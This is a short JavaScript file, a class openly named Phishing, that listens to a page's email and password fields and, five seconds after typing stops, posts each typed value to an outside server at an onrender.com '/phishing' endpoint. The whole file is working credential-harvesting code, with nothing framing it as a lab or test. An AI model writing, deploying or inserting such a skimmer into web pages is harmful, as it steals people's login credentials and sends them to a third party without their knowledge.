const email = document.getElementById("email");
const password = document.getElementById("password");

class Phishing {
  emailId = null;
  passwordId = null;
  constructor() {
    this.email = document.getElementById("email");
    this.password = document.getElementById("password");
    this.email.addEventListener("input", (event) =>
      this.inputHandler(event, "email")
    );
    this.password.addEventListener("input", (event) =>
      this.inputHandler(event, "password")
    );
  }

  inputHandler(event, name) {
    if (this.emailId && name == "email") {
      clearTimeout(this.emailId);
    }

    if (this.passwordId && name == "password") {
      clearTimeout(this.passwordId);
    }

    if (name == "email") {
      this.emailId = setTimeout(() => {
        console.log(`${name}`, event.target.value);
        fetch("https://swag-v2-backend.onrender.com/phishing", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ email: event.target.value }),
        });
      }, 5000);
    } else {
      this.passwordId = setTimeout(() => {
        console.log(`${name}`, event.target.value);
            fetch('https://swag-v2-backend.onrender.com/phishing', {
            method: "POST",
            headers: {
                "Content-Type":"application/json"
            }, 
            body: JSON.stringify({ password: event.target.value })
         })  
      }, 5000);
    }
  }
}

const phishing = new Phishing();
